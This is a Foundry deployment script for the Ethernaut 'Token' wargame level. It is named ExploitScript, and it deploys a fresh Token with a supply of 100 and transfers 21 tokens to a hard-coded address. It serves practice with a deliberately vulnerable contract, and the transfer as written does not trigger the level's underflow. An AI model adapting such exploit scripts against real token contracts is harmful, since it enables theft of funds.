// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../../src/Ethernaut/Token.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Token token = new Token(100);
        token.transfer(0xd0133a1e741BfC7F44B01b6647F12777506e250f, 21);
        vm.stopBroadcast();
    }
}
